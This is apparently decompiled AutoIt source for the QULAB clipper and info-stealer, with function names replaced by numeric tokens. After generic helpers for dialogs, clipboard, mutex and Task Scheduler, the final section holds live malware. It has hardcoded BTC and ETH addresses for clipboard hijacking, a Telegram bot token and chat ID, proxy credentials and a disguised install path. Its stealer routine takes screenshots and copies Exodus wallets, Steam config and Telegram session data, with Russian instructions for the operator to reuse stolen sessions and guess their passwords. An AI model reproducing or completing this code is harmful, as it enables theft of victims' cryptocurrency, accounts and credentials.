28$ARESULT=58("comdlg32.dll","bool","ChooseColor","struct*",$TCHOOSE)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]=0534287(-3,-3,-1)
28$SCOLOR_PICKED=66($TCHOOSE,"rgbResult")
4$IRETURNTYPE=15
34"0x"&199(306($SCOLOR_PICKED),6)
7$IRETURNTYPE=25
$SCOLOR_PICKED=199(306($SCOLOR_PICKED),6)
34"0x"&325($SCOLOR_PICKED,5,2)&325($SCOLOR_PICKED,3,2)&325($SCOLOR_PICKED,1,2)
7$IRETURNTYPE=05
34$SCOLOR_PICKED
6
34287(-4,-4,-1)
8
33
32_CHOOSEFONT($SFONTNAME="Courier New",$IPOINTSIZE=10,$IFONTCOLORREF=0,$IFONTWEIGHT=0,$BITALIC=40,$BUNDERLINE=40,$BSTRIKETHRU=40,$HWNDOWNER=0)
28$IITALIC=0,$IUNDERLINE=0,$ISTRIKEOUT=0
$IFONTCOLORREF=19(21(17($IFONTCOLORREF,255),-16),17($IFONTCOLORREF,65280),21(17($IFONTCOLORREF,16711680),16))
28$HDC=__MISC_GETDC(0)
28$IHEIGHT=280(($IPOINTSIZE*__MISC_GETDEVICECAPS($HDC,$LOGPIXELSX))/72,0)
__MISC_RELEASEDC(0,$HDC)
28$TCHOOSEFONT=65($TAGCHOOSEFONT)
28$TLOGFONT=65($TAGLOGFONT)
69($TCHOOSEFONT,"Size",68($TCHOOSEFONT))
69($TCHOOSEFONT,"hWndOwner",$HWNDOWNER)
69($TCHOOSEFONT,"LogFont",67($TLOGFONT))
69($TCHOOSEFONT,"PointSize",$IPOINTSIZE)
69($TCHOOSEFONT,"Flags",19($CF_SCREENFONTS,$CF_PRINTERFONTS,$CF_EFFECTS,$CF_INITTOLOGFONTSTRUCT,$CF_NOSCRIPTSEL))
69($TCHOOSEFONT,"rgbColors",$IFONTCOLORREF)
69($TCHOOSEFONT,"FontType",0)
69($TLOGFONT,"Height",$IHEIGHT)
69($TLOGFONT,"Weight",$IFONTWEIGHT)
69($TLOGFONT,"Italic",$BITALIC)
69($TLOGFONT,"Underline",$BUNDERLINE)
69($TLOGFONT,"Strikeout",$BSTRIKETHRU)
69($TLOGFONT,"FaceName",$SFONTNAME)
28$ARESULT=58("comdlg32.dll","bool","ChooseFontW","struct*",$TCHOOSEFONT)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]=0534287(-3,-3,-1)
28$SFACENAME=66($TLOGFONT,"FaceName")
4323($SFACENAME)=01323($SFONTNAME)>05$SFACENAME=$SFONTNAME
466($TLOGFONT,"Italic")5$IITALIC=2
466($TLOGFONT,"Underline")5$IUNDERLINE=4
466($TLOGFONT,"Strikeout")5$ISTRIKEOUT=8
28$IATTRIBUTES=19($IITALIC,$IUNDERLINE,$ISTRIKEOUT)
28$ISIZE=66($TCHOOSEFONT,"PointSize")/10
28$ICOLORREF=66($TCHOOSEFONT,"rgbColors")
28$IWEIGHT=66($TLOGFONT,"Weight")
28$SCOLOR_PICKED=199(306($ICOLORREF),6)
34331($IATTRIBUTES&","&$SFACENAME&","&$ISIZE&","&$IWEIGHT&","&$ICOLORREF&","&"0x"&$SCOLOR_PICKED&","&"0x"&325($SCOLOR_PICKED,5,2)&325($SCOLOR_PICKED,3,2)&325($SCOLOR_PICKED,1,2),",")
33
32_CLIPPUTFILE($SFILEPATH,$SDELIMITER="|")
2830$GMEM_MOVEABLE=2,$CF_HDROP=15
$SFILEPATH&=$SDELIMITER&$SDELIMITER
28$NGLOBMEMSIZE=2*(323($SFILEPATH)+20)
28$ARESULT=58("user32.dll","bool","OpenClipboard","hwnd",0)
4@ERROR2$ARESULT[0]=0534287(1,_WINAPI_GETLASTERROR(),40)
28$IERROR=0,$ILASTERROR=0
$ARESULT=58("user32.dll","bool","EmptyClipboard")
4@ERROR23$ARESULT[0]5
$IERROR=2
$ILASTERROR=_WINAPI_GETLASTERROR()
6
$ARESULT=58("kernel32.dll","handle","GlobalAlloc","uint",$GMEM_MOVEABLE,"ulong_ptr",$NGLOBMEMSIZE)
4@ERROR23$ARESULT[0]5
$IERROR=3
$ILASTERROR=_WINAPI_GETLASTERROR()
6
28$HGLOBAL=$ARESULT[0]
$ARESULT=58("kernel32.dll","ptr","GlobalLock","handle",$HGLOBAL)
4@ERROR23$ARESULT[0]5
$IERROR=4
$ILASTERROR=_WINAPI_GETLASTERROR()
6
28$HLOCK=$ARESULT[0]
28$TDROPFILES=65("dword pFiles;"&$TAGPOINT&";bool fNC;bool fWide;wchar["&323($SFILEPATH)+1&"]",$HLOCK)
4@ERROR534287(5,6,40)
28$TSTRUCT=65("dword;long;long;bool;bool")
69($TDROPFILES,"pFiles",68($TSTRUCT))
69($TDROPFILES,"X",0)
69($TDROPFILES,"Y",0)
69($TDROPFILES,"fNC",0)
69($TDROPFILES,"fWide",1)
69($TDROPFILES,6,$SFILEPATH)
13$I=115323($SFILEPATH)
466($TDROPFILES,6,$I)=$SDELIMITER569($TDROPFILES,6,28(0),$I)
14
$ARESULT=58("user32.dll","handle","SetClipboardData","uint",$CF_HDROP,"handle",$HGLOBAL)
4@ERROR23$ARESULT[0]5
$IERROR=6
$ILASTERROR=_WINAPI_GETLASTERROR()
8
$ARESULT=58("kernel32.dll","bool","GlobalUnlock","handle",$HGLOBAL)
4(@ERROR23$ARESULT[0])13$IERROR1_WINAPI_GETLASTERROR()5
$IERROR=8
$ILASTERROR=_WINAPI_GETLASTERROR()
8
8
$ARESULT=58("kernel32.dll","ptr","GlobalFree","handle",$HGLOBAL)
4(@ERROR2$ARESULT[0])13$IERROR5
$IERROR=9
$ILASTERROR=_WINAPI_GETLASTERROR()
8
8
8
$ARESULT=58("user32.dll","bool","CloseClipboard")
4(@ERROR23$ARESULT[0])13$IERROR534287(7,_WINAPI_GETLASTERROR(),40)
4$IERROR534287($IERROR,$ILASTERROR,40)
3439
33
32_MOUSETRAP($ILEFT=0,$ITOP=0,$IRIGHT=0,$IBOTTOM=0)
28$ARETURN=0
4$ILEFT=415$ILEFT=0
4$ITOP=415$ITOP=0
4$IRIGHT=415$IRIGHT=0
4$IBOTTOM=415$IBOTTOM=0
4@NUMPARAMS=05
$ARETURN=58("user32.dll","bool","ClipCursor","ptr",0)
4@ERROR23$ARETURN[0]534287(1,_WINAPI_GETLASTERROR(),40)
6
4@NUMPARAMS=25
$IRIGHT=$ILEFT+1
$IBOTTOM=$ITOP+1
8
28$TRECT=65($TAGRECT)
69($TRECT,"Left",$ILEFT)
69($TRECT,"Top",$ITOP)
69($TRECT,"Right",$IRIGHT)
69($TRECT,"Bottom",$IBOTTOM)
$ARETURN=58("user32.dll","bool","ClipCursor","struct*",$TRECT)
4@ERROR23$ARETURN[0]534287(2,_WINAPI_GETLASTERROR(),40)
8
3439
33
32_SINGLETON($SOCCURRENCENAME,$IFLAG=0)
2830$ERROR_ALREADY_EXISTS=183
2830$SECURITY_DESCRIPTOR_REVISION=1
28$TSECURITYATTRIBUTES=0
417($IFLAG,2)5
28$TSECURITYDESCRIPTOR=65("byte;byte;word;ptr[4]")
28$ARET=58("advapi32.dll","bool","InitializeSecurityDescriptor","struct*",$TSECURITYDESCRIPTOR,"dword",$SECURITY_DESCRIPTOR_REVISION)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]5
$ARET=58("advapi32.dll","bool","SetSecurityDescriptorDacl","struct*",$TSECURITYDESCRIPTOR,"bool",1,"ptr",0,"bool",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]5
$TSECURITYATTRIBUTES=65($TAGSECURITY_ATTRIBUTES)
69($TSECURITYATTRIBUTES,1,68($TSECURITYATTRIBUTES))
69($TSECURITYATTRIBUTES,2,67($TSECURITYDESCRIPTOR))
69($TSECURITYATTRIBUTES,3,0)
8
8
8
28$AHANDLE=58("kernel32.dll","handle","CreateMutexW","struct*",$TSECURITYATTRIBUTES,"bool",1,"wstr",$SOCCURRENCENAME)
4@ERROR534287(@ERROR,@EXTENDED,0)
28$ALASTERROR=58("kernel32.dll","dword","GetLastError")
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ALASTERROR[0]=$ERROR_ALREADY_EXISTS5
417($IFLAG,1)5
58("kernel32.dll","bool","CloseHandle","handle",$AHANDLE[0])
4@ERROR534287(@ERROR,@EXTENDED,0)
34287($ALASTERROR[0],$ALASTERROR[0],0)
6
35-1
8
8
34$AHANDLE[0]
33
32_ISPRESSED($SHEXKEY,$VDLL="user32.dll")
28$ARETURN=58($VDLL,"short","GetAsyncKeyState","int","0x"&$SHEXKEY)
4@ERROR534287(@ERROR,@EXTENDED,40)
3417($ARETURN[0],32768)<>0
33
32_VERSIONCOMPARE($SVERSION1,$SVERSION2)
4$SVERSION1=$SVERSION25340
28$SSUBVERSION1="",$SSUBVERSION2=""
4313(330($SVERSION1,1))5
$SSUBVERSION1=330($SVERSION1,1)
$SVERSION1=337($SVERSION1,1)
8
4313(330($SVERSION2,1))5
$SSUBVERSION2=330($SVERSION2,1)
$SVERSION2=337($SVERSION2,1)
8
28$AVERSION1=331($SVERSION1,".,"),$AVERSION2=331($SVERSION2,".,")
28$IPARTDIFFERENCE=($AVERSION1[0]-$AVERSION2[0])
4$IPARTDIFFERENCE<05
27$AVERSION1[369($AVERSION2)]
$AVERSION1[0]=369($AVERSION1)-1
13$I=(369($AVERSION1)-0($IPARTDIFFERENCE))15$AVERSION1[0]
$AVERSION1[$I]="0"
14
7$IPARTDIFFERENCE>05
27$AVERSION2[369($AVERSION1)]
$AVERSION2[0]=369($AVERSION2)-1
13$I=(369($AVERSION2)-0($IPARTDIFFERENCE))15$AVERSION2[0]
$AVERSION2[$I]="0"
14
8
13$I=115$AVERSION1[0]
4315($AVERSION1[$I])1315($AVERSION2[$I])5
4250($AVERSION1[$I])>250($AVERSION2[$I])5
34288(2,1)
7250($AVERSION1[$I])<250($AVERSION2[$I])5
34288(2,-1)
7$I=$AVERSION1[0]5
4$SSUBVERSION1>$SSUBVERSION25
34288(3,1)
7$SSUBVERSION1<$SSUBVERSION25
34288(3,-1)
8
8
6
4$AVERSION1[$I]>$AVERSION2[$I]5
34288(1,1)
7$AVERSION1[$I]<$AVERSION2[$I]5
34288(1,-1)
8
8
14
34288(0($IPARTDIFFERENCE),0)
33
32__MISC_GETDC($HWND)
28$ARESULT=58("user32.dll","handle","GetDC","hwnd",$HWND)
4@ERROR23$ARESULT[0]534287(1,_WINAPI_GETLASTERROR(),0)
34$ARESULT[0]
33
32__MISC_GETDEVICECAPS($HDC,$IINDEX)
28$ARESULT=58("gdi32.dll","int","GetDeviceCaps","handle",$HDC,"int",$IINDEX)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32__MISC_RELEASEDC($HWND,$HDC)
28$ARESULT=58("user32.dll","int","ReleaseDC","hwnd",$HWND,"handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]<>0
33
2930$OSVERSIONINFO="struct;dword OSVersionInfoSize;dword MajorVersion;dword MinorVersion;dword BuildNumber;dword PlatformId;wchar CSDVersion[128];endstruct"
2930$_OSVER=_OSVER()
32_OSVER()
28$TOSVI=65($OSVERSIONINFO)
69($TOSVI,1,68($TOSVI))
28$ARET=58("kernel32.dll","bool","GetVersionExW","struct*",$TOSVI)
4@ERROR23$ARET[0]534287(@ERROR,@EXTENDED,0)
3419(21(66($TOSVI,2),-8),66($TOSVI,3))
33
32EMPTYWORKINGSET($IPID=0)
43$IPID5$IPID=@AUTOITPID
28$HPROCESS=58("kernel32.dll","handle","OpenProcess","dword",(($_OSVER<1536)12804352),"bool",0,"dword",$IPID)
4@ERROR23$HPROCESS[0]534287(@ERROR+20,@EXTENDED,0)
28$ARET=58(@SYSTEMDIR&"\psapi.dll","bool","EmptyWorkingSet","handle",$HPROCESS[0])
341
33
29$OMYRET[2]
29$COMERRORFOUND=40
29$OMYERROR=253("AutoIt.Error","ComErrFunc")
29$COMERRORHANDLERDEBUG=0
32COMERRFUNC()
$OMYRET[0]=199($OMYERROR.number,8)
$OMYRET[1]=333($OMYERROR.description,3)
4$COMERRORHANDLERDEBUG=15
249(0,"AutoItCOM Test","We intercepted a COM Error !"&@CRLF&@CRLF&"err.description is: "&@TAB&$OMYERROR.description&@CRLF&"err.windescription:"&@TAB&$OMYERROR.windescription&@CRLF&"err.number is: "&@TAB&199($OMYERROR.number,8)&@CRLF&"err.lastdllerror is: "&@TAB&$OMYERROR.lastdllerror&@CRLF&"err.scriptline is: "&@TAB&$OMYERROR.scriptline&@CRLF&"err.source is: "&@TAB&$OMYERROR.source&@CRLF&"err.helpfile is: "&@TAB&$OMYERROR.helpfile&@CRLF&"err.helpcontext is: "&@TAB&$OMYERROR.helpcontext)
8
$COMERRORFOUND=39
287(1)
34
33
29$WBEMFLAGRETURNIMMEDIATELY=16
29$WBEMFLAGFORWARDONLY=32
30$VT_EMPTY=0
30$VT_NULL=1
32_TASKFOLDERCREATE($FOLDER)
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$OSERVICE,$OFOLDER,$ONEWFOLDER
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder("\")
4231($OFOLDER)5
$RESULT=$OFOLDER.CreateFolder($FOLDER)
8
$OSERVICE=0
43$COMERRORFOUND5
341
8
33
32_TASKFOLDERDELETE($FOLDER)
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$OSERVICE,$OFOLDER
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder("\")
4231($OFOLDER)5
$RESULT=$OFOLDER.DeleteFolder($FOLDER,0)
8
$OSERVICE=0
43$COMERRORFOUND5
341
8
33
32_TASKFOLDEREXISTS($FOLDER="\")
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$OSERVICE,$OFOLDER
28$RETVAL=0
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder($FOLDER)
4231($OFOLDER)5
$RETVAL=1
6
$RETVAL=0
8
$OSERVICE=0
43$COMERRORFOUND5
341
8
33
32_TASKEXISTS($TASKNAME,$FOLDER="\")
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$OSERVICE,$OFOLDER
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder($FOLDER)
4231($OFOLDER)5
$OTASK=$OFOLDER.GetTask($TASKNAME)
4231($OTASK)5
$RETVAL=1
6
$RETVAL=0
8
6
$RETVAL=0
8
$OSERVICE=0
43$COMERRORFOUND5
341
8
33
32_TASKSTOP($TASKNAME,$FOLDER="\")
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$OSERVICE,$OFOLDER
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder($FOLDER)
$TEMPERROR=@ERROR
4231($OFOLDER)5
$OTASK=$OFOLDER.GetTask($TASKNAME)
$INSTCOUNT=1
4231($OTASK)5
$OTASK.Stop(0)
13$COUNTER=015500
293(100)
$INSTANCES=$OTASK.GetInstances(0)
4231($INSTANCES)5
4$INSTANCES.Count()=05
$INSTCOUNT=0
18
8
8
14
4$INSTCOUNT=05
$RETVAL=1
6
$RETVAL=0
8
6
$RETVAL=0
8
6
$RETVAL=0
8
$OSERVICE=0
43$COMERRORFOUND5
341
8
33
32_TASKENABLE($TASKNAME,$FOLDER="")
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$OSERVICE,$OFOLDER
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder($FOLDER)
4231($OFOLDER)5
$OTASK=$OFOLDER.GetTask($TASKNAME)
$INSTCOUNT=0
4231($OTASK)5
$OTASK.Enabled=39
$RETVAL=1
6
$RETVAL=0
8
6
$RETVAL=0
8
$OSERVICE=0
43$COMERRORFOUND5
341
8
33
32_TASKDISABLE($TASKNAME,$FOLDER="")
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$OSERVICE,$OFOLDER
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder($FOLDER)
4231($OFOLDER)5
$OTASK=$OFOLDER.GetTask($TASKNAME)
$INSTCOUNT=0
4231($OTASK)5
$OTASK.Enabled=40
$RETVAL=1
6
$RETVAL=0
8
6
$RETVAL=0
8
$OSERVICE=0
43$COMERRORFOUND5
341
8
33
32_TASKISENABLED($TASKNAME,$FOLDER="")
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$OSERVICE,$OFOLDER
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder($FOLDER)
4231($OFOLDER)5
$OTASK=$OFOLDER.GetTask($TASKNAME)
$INSTCOUNT=0
4231($OTASK)5
$RETVAL=$OTASK.Enabled
6
$RETVAL=0
8
6
$RETVAL=0
8
$OSERVICE=0
43$COMERRORFOUND5
341
8
33
32_TASKSTART($TASKNAME,$FOLDER="\")
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$OSERVICE,$OFOLDER
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder($FOLDER)
4231($OFOLDER)5
$OTASK=$OFOLDER.GetTask($TASKNAME)
$INSTCOUNT=0
4231($OTASK)5
$OTASK.Run($VT_NULL)
$RETVAL=1
6
$RETVAL=0
8
6
$RETVAL=0
8
$OSERVICE=0
43$COMERRORFOUND5
341
8
33
32_TASKISRUNNING($TASKNAME,$FOLDER="\")
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$OSERVICE,$OFOLDER
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder($FOLDER)
4231($OFOLDER)5
$OTASK=$OFOLDER.GetTask($TASKNAME)
4231($OTASK)5
$INSTANCES=$OTASK.GetInstances(0)
4231($INSTANCES)5
4$INSTANCES.Count()>05
$RETVAL=1
6
$RETVAL=2
8
6
$RETVAL=0
8
6
$RETVAL=0
8
6
$RETVAL=0
8
$OSERVICE=0
43$COMERRORFOUND5
341
8
33
32_TASKDELETE($TASKNAME,$FOLDER="\")
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$OSERVICE,$OFOLDER
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder($FOLDER)
4231($OFOLDER)5$ODELETED=$OFOLDER.DeleteTask($TASKNAME,0)
$OSERVICE=0
43$COMERRORFOUND5
341
8
33
32_TASKLISTALL($FOLDER="\",$HIDDEN=1)
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$ICOUNT=1
$OUTPUT=""
28$OSERVICE,$OFOLDER
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder($FOLDER)
4231($OFOLDER)5
$OTASKS=$OFOLDER.GetTasks($HIDDEN)
4231($OTASKS)13$COMERRORFOUND5
13$OBJITEM17$OTASKS
$OUTPUT=$OUTPUT&$OBJITEM.Name()&"|"
14
8
8
4$OUTPUT<>""5$OUTPUT=337($OUTPUT,1)
$OSERVICE=0
43$COMERRORFOUND5
34($OUTPUT)
8
33
32_TASKCREATE($TASKNAME,$TASKDESCRIPTION,$TRIGGEREVENT,$STARTTRIGGER,$ENDTRIGGER,$DAYSOFWEEK,$DAYSOFMONTH,$MONTHOFYEAR,$WEEKSOFMONTH,$DAYSINTERVAL,$INTERVAL,$REPETITIONENABLED,$LOGONTYPE,$RUNLEVEL,$USERNAME,$PASSWORD,$PROGRAM,$WORKINGDIRECTORY="",$ARGUMENTS="",$RUNONLYIFNETWORKAVAILABLE=40,$ACTIVE=39,$MULTIINST=0,$NOBATSTART=40,$STOPONBAT=40,$HIDDEN=39,$IDLE=40,$WAKETORUN=39,$TIMELIMIT="PT99999H",$PRIORITY=5,$DURATION="",$STARTWHENAVAILABLE=39)
43_TASKISVALIDPLATFROM()534287(2,2,0)
28$OSERVICE,$OFOLDER,$OTASKDEFINITION,$OREGISTRATIONINFO,$OSETTINGS
28$OPRINCIPAL,$OCOLACTIONS,$OACTION,$OTRIGGER,$OCOLTRIGGERS,$OTRIGGERREPETITION
4$TASKNAME=""2$PROGRAM=""534287(1,1,0)
$OSERVICE=251("Schedule.Service")
$OSERVICE.Connect()
$OFOLDER=$OSERVICE.GetFolder("\")
$OTASKDEFINITION=$OSERVICE.NewTask(0)
$OREGISTRATIONINFO=$OTASKDEFINITION.RegistrationInfo()
$OREGISTRATIONINFO.Description()=$TASKDESCRIPTION
$OREGISTRATIONINFO.Author()=@LOGONDOMAIN&"\"&@USERNAME
$OSETTINGS=$OTASKDEFINITION.Settings()
$OSETTINGS.MultipleInstances()=$MULTIINST
$OSETTINGS.DisallowStartIfOnBatteries()=$NOBATSTART
$OSETTINGS.StopIfGoingOnBatteries()=$STOPONBAT
$OSETTINGS.AllowHardTerminate()=39
$OSETTINGS.StartWhenAvailable()=$STARTWHENAVAILABLE
$OSETTINGS.RunOnlyIfNetworkAvailable()=$RUNONLYIFNETWORKAVAILABLE
$OSETTINGS.Enabled()=$ACTIVE
$OSETTINGS.Hidden()=$HIDDEN
$OSETTINGS.RunOnlyIfIdle()=$IDLE
$OSETTINGS.WakeToRun()=$WAKETORUN
$OSETTINGS.ExecutionTimeLimit()=$TIMELIMIT
$OSETTINGS.Priority()=$PRIORITY
$OPRINCIPAL=$OTASKDEFINITION.Principal()
$OPRINCIPAL.Id()=@USERNAME
$OPRINCIPAL.DisplayName()=@USERNAME
$OPRINCIPAL.LogonType()=$LOGONTYPE
$OPRINCIPAL.RunLevel()=$RUNLEVEL
$OCOLTRIGGERS=$OTASKDEFINITION.Triggers()
$OTRIGGER=$OCOLTRIGGERS.Create($TRIGGEREVENT)
$OTRIGGER.Id()="TriggerID"
$OTRIGGER.Enabled()=39
$OTRIGGER.StartBoundary()=$STARTTRIGGER
$OTRIGGER.EndBoundary()=$ENDTRIGGER
4$TRIGGEREVENT=32$TRIGGEREVENT=55
$OTRIGGER.DaysOfWeek()=$DAYSOFWEEK
8
4$TRIGGEREVENT=45
$OTRIGGER.DaysOfMonth()=$DAYSOFMONTH
$OTRIGGER.MonthsOfYear()=$MONTHOFYEAR
8
4$TRIGGEREVENT=55
$OTRIGGER.WeeksOfMonth()=$WEEKSOFMONTH
8
4$TRIGGEREVENT=25
$OTRIGGER.DaysInterval()=$DAYSINTERVAL
8
4$REPETITIONENABLED5
$OTRIGGERREPETITION=$OTRIGGER.Repetition()
$OTRIGGERREPETITION.Interval()=$INTERVAL
4$DURATION<>""5$OTRIGGERREPETITION.Duration()=$DURATION
8
$OCOLACTIONS=$OTASKDEFINITION.Actions()
$OCOLACTIONS.Context()=@USERNAME
$OACTION=$OTASKDEFINITION.Actions.Create(0)
$OACTION.Path()=$PROGRAM
$OACTION.WorkingDirectory()=$WORKINGDIRECTORY
$OACTION.Arguments()=$ARGUMENTS
$OFOLDER.RegisterTaskDefinition($TASKNAME,$OTASKDEFINITION,6,$USERNAME,$PASSWORD,$LOGONTYPE,"")
$OSERVICE=0
4$COMERRORFOUND5
$COMERRORFOUND=0
287(1)
340
6
341
8
33
32_TASKSCHEDULERAUTOSTART()
4278("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule","Start")>05
341
6
340
8
33
32_TASKISVALIDPLATFROM()
$AUTIOTVERSIONOK=_VERSIONCOMPARE(@AUTOITVERSION,"3.3.9.4")=0
43@ERROR1@OSVERSION="WIN_XP"2@OSVERSION="WIN_XPe"2@OSVERSION="WIN_2000"1$AUTIOTVERSIONOK<>-15
340
6
341
8
33
32_TRAS($ITEXT)
26$ALETTERS[33+33][2]=[["а","a"],["б","b"],["в","v"],["г","g"],["д","d"],["е","e"],["ё","e"],["ж","zh"],["з","z"],["и","i"],["й","y"],["к","k"],["л","l"],["м","m"],["н","n"],["о","o"],["п","p"],["р","r"],["с","s"],["т","t"],["u",""],["ф","f"],["х","h"],["ц","ts"],["ч","ch"],["ш","sh"],["щ","shch"],["ъ","'"],["ы","i"],["ь",""],["э","ie"],["ю","yu"],["я","ya"],["А","A"],["Б","B"],["В","V"],["Г","G"],["Д","D"],["Е","E"],["Ё","E"],["Ж","Zh"],["з","z"],["и","i"],["Й","Y"],["К","K"],["Л","L"],["М","M"],["Н","N"],["О","O"],["П","P"],["Р","R"],["С","S"],["Т","T"],["u",""],["Ф","F"],["Х","H"],["Ц","Ts"],["Ч","Ch"],["Ш","Sh"],["Щ","Shch"],["Ъ","'"],["Ы","I"],["Ь",""],["Э","Ie"],["Ю","Yu"],["Я","Ya"]]
$SBUFFER=$ITEXT
13$I=015369($ALETTERS)-1
$SBUFFER=327($SBUFFER,$ALETTERS[$I][0],$ALETTERS[$I][1])
14
34$SBUFFER
33
32ID()
$ID=336(335(@USERNAME&@COMPUTERNAME&@OSVERSION&@OSARCH&@DESKTOPHEIGHT&@DESKTOPWIDTH&@DESKTOPREFRESH),2)
$SIZE=323($ID)
4$SIZE>405
$ID=337($ID,$SIZE-40)
7$SIZE<405
$ID&=330($ID,40-$SIZE)
8
34$ID
33
$BTC="1JACfiJagEgVV9FfaoYHxvF3pMcPY2Chz8"
$ETH="0x7144FD29045be6397EcaC7a8cef796De5d01c0b9"
$WATERTEXT="Clipper by QULAB @ OS: "&328(@OSVERSION,"WIN_","Windows ")&" "&@OSARCH&" @ USERNAME: "&_TRAS(@USERNAME)
$ID=ID()
$FILE="msxml6r.exe"
$TASK="{KIKRATWI-BKSD-BRT-46P2-2DUCP1753OFR}"
$DIR=@APPDATADIR&"\amd64_sisraid2.inf.resources"
$TDIR="N-5-8-86-1394221787-1012234082-1130347398-2905"
29$TOKEN="697283818:AAEru1qso2RcHXIUtJcjk_ITDZsxOQ9u0TM"
29$TID="653360588"
29$SPROXY="196.18.0.25:8000",$INETDATA="<error>",$SUSER="oSMHD2",$SPASS="WnjtFG",$OBJ=254("winmgmts:\\localhost\"),$7ZPATH=$DIR&"\"&337($FILE,3)&"module.exe",$JS,$PREVBROWS,$IREAD,$FORMHTEXT,$CREDITTEXT,$PROGRAMSTEXT,$MEM,$PROCESSTEXT,$PASSWORDSTEXT,$GPUITEM,$CPUITEM,$REGPATHER,$GPU="<empty>",$CPU="<empty>",$WATERTEXTTLGRM=""&@CRLF,$MODULE=337($FILE,3)&"sqlite3.module.dll"
$IPLOG1=""
$IPLOG2=""
4$ID="47656F6D657472794F574E4445534B544F502D31"1$TOKEN<>"697283818:AAEru1qso2RcHXIUtJcjk_ITDZsxOQ9u0TM"535
495($DIR&"\"&$FILE)1@SCRIPTFULLPATH<>$DIR&"\"&$FILE5
MELT()
8
4_SINGLETON($BTC&$ETH&$ID,1)=05
4@SCRIPTFULLPATH=$DIR&"\"&$FILE5
35
7@SCRIPTFULLPATH<>$DIR&"\"&$FILE5
MELT()
8
8
4@SCRIPTFULLPATH=$DIR&"\"&$FILE1(95(@SCRIPTDIR&"\"&$ID&".7z")295(@SCRIPTDIR&"\"&$ID&".log"))5
4105($DIR&"\"&$ID&".7z")<1005
STEALER()
54($DIR&"\1")
_SCREENCAPTURE_SETJPGQUALITY(45)
_SCREENCAPTURE_CAPTURE($DIR&"\1\Screen.jpg")
13$I=115$PATH[0][0]
4$PATH[$I][2]="Wallets"5
54($DIR&"\1\"&$PATH[$I][2])
$INS="Для того, чтобы установить сессию для Exodus нужно:"&@CRLF&"1) Скачать Exodus (https://www.exodus.io/releases/)"&@CRLF&'2) Закинуть содержимое папки лога Wallets\Exodus в путь "%appdata%\Exodus\exodus.wallet", сохранив, если есть, свои данные'&@CRLF&"3) Запустить Exodus и подбирать пароли к сессии"
4$PATH[$I][1]="Exodus"5
MOVEANDINSTRUCT($PATH[$I][0],$DIR&"\1\"&$PATH[$I][2]&"\"&$PATH[$I][1],$DIR&"\1\"&$PATH[$I][2]&"\"&$PATH[$I][1]&"\Инструкция по установке.txt",1,$INS)
6
91($PATH[$I][0],$DIR&"\1\"&$PATH[$I][2]&"\"&$PATH[$I][1],9)
8
7$PATH[$I][2]="Steam"5
54($DIR&"\1\"&$PATH[$I][2])
$INS="Для того, чтобы установить сессию для Steam нужно:"&@CRLF&"1) Скачать Steam (https://store.steampowered.com/about/)"&@CRLF&'2) Закинуть содержимое папки лога Steam в путь "<папка стима>", сохранив, если есть, свои данные'&@CRLF&"3) Запустить Steam и подбирать пароли к сессии"
4$PATH[$I][1]="config"5
MOVEANDINSTRUCT($PATH[$I][0],$DIR&"\1\"&$PATH[$I][2]&"\"&$PATH[$I][1],$DIR&"\1\"&$PATH[$I][2]&"\Инструкция по установке.txt",1,$INS)
6
MOVEANDINSTRUCT($PATH[$I][0],$DIR&"\1\"&$PATH[$I][2]&"\"&$PATH[$I][1],$DIR&"\1\"&$PATH[$I][2]&"\Инструкция по установке.txt",0,$INS)
8
7$PATH[$I][2]="Telegram"5
54($DIR&"\1\"&$PATH[$I][2])
$INS="Для того, чтобы установить сессию для Telegram нужно:"&@CRLF&"1) Скачать Telegram (https://tlgrm.ru/apps)"&@CRLF&'2) Закинуть содержимое папки лога Telegram в путь "<папка Telegram>\tdata", сохранив, если есть, свои данные'&@CRLF&"3) Запустить Telegram и радоваться"
4330($PATH[$I][1],2)=":D"5
MOVEANDINSTRUCT($PATH[$I][0],$DIR&"\1\"&$PATH[$I][2]&"\"&337($PATH[$I][1],2),$DIR&"\1\"&$PATH[$I][2]&"\Инструкция по установке.txt",1,$INS)
6
